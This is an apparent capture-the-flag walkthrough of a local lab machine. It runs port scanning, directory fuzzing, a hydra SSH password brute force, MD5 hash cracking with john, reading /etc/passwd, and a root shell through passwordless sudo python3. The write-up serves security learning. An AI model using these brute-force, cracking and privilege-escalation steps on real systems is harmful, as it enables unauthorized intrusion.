# IP
172.17.0.2
# Reconnaissance
## Host discovery
``` bash
ping -c 2 172.17.0.2
PING 172.17.0.2 (172.17.0.2) 56(84) bytes of data.
64 bytes from 172.17.0.2: icmp_seq=1 ttl=64 time=0.073 ms
64 bytes from 172.17.0.2: icmp_seq=2 ttl=64 time=0.059 ms

--- 172.17.0.2 ping statistics ---
2 packets transmitted, 2 received, 0% packet loss, time 1022ms
rtt min/avg/max/mdev = 0.059/0.066/0.073/0.007 ms
```
## Ports scanning
``` bash
sudo nmap -p- --open -sS --min-rate 5000 -n -Pn 172.17.0.2
Starting Nmap 7.99 ( https://nmap.org ) at 2026-10-07 14:23 -0300
Nmap scan report for 172.17.0.2
Host is up (0.0000020s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
MAC Address: 62:A7:D9:1C:90:73 (Unknown)

Nmap done: 1 IP address (1 host up) scanned in 0.45 seconds
```
``` bash
sudo nmap -p22,80 -sS -sCV -T4 --min-rate 5000 -n -Pn 172.17.0.2
Starting Nmap 7.99 ( https://nmap.org ) at 2026-10-07 14:23 -0300
Nmap scan report for 172.17.0.2
Host is up (0.000024s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u3 (protocol 2.0)
| ssh-hostkey:
|   256 9e:10:58:a5:1a:42:9d:be:e5:19:d1:2e:79:9c:ce:21 (ECDSA)
|_  256 6b:a3:a8:84:e0:33:57:fc:44:49:69:41:7d:d3:c9:92 (ED25519)
80/tcp open  http    Apache httpd 2.4.62 ((Debian))
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache/2.4.62 (Debian)
MAC Address: 62:A7:D9:1C:90:73 (Unknown)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 6.48 seconds
```
# Web enumeration
``` bash
curl http://172.17.0.2
<html><body><h1>Pista: Encuentra la clave para A en los archivos.</h1></body></html>
```
## Dir fuzzing
``` bash
gobuster dir -u http://172.17.0.2 -w /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-lowercase-2.3-medium.txt -x php,html,txt,zip,sql,env,config
===============================================================
Gobuster v3.8.2
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://172.17.0.2
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-lowercase-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8.2
[+] Extensions:              php,html,txt,zip,sql,env,config
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
index.html           (Status: 200) [Size: 85]
server-status        (Status: 403) [Size: 275]
Progress: 1661128 / 1661128 (100.00%)
===============================================================
Finished
===============================================================
```
## Whatweb
``` bash
whatweb http://172.17.0.2
http://172.17.0.2 [200 OK] Apache[2.4.62], Country[RESERVED][ZZ], HTTPServer[Debian Linux][Apache/2.4.62 (Debian)], IP[172.17.0.2]
```
# SSH
Since there's not much to keeping enumerating the web, let's look at the hint. The hint says to look out for a's password. Let's assume a is a system user.
## Brute force with hydra
``` bash
hydra -l a -P /usr/share/wordlists/rockyou.txt ssh://172.17.0.2 -vV -t 64
[22][ssh] host: 172.17.0.2   login: a   password: secret
```
``` bash
ssh a@172.17.0.2
```
# Privilege escalation
``` bash
cat /etc/passwd | grep /bin/bash
root:x:0:0:root:/root:/bin/bash
spencer:x:1000:1000::/home/spencer:/bin/bash
a:x:1001:1001::/home/a:/bin/bash
```
## Lateral movement: a -> spencer
``` bash
find / -name *spencer* 2>/dev/null
/srv/ftp/hash_spencer.txt
/home/spencer
```
``` bash
cat /srv/ftp/hash_spencer.txt
7c6a180b36896a0a8c02787eeafb0e4c
```
``` bash
echo '7c6a180b36896a0a8c02787eeafb0e4c' > hash.txt && john --format=raw-MD5 --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
password1        (?)
```
``` bash
su spencer
```
## Lateral movement: spencer -> root
``` bash
sudo -l
(ALL) NOPASSWD: /usr/bin/python3
```
``` bash
sudo -u root /usr/bin/python3 -c 'import os; os.execl("/bin/bash", "bash")'
```
# Root
``` bash
whoami
root
```
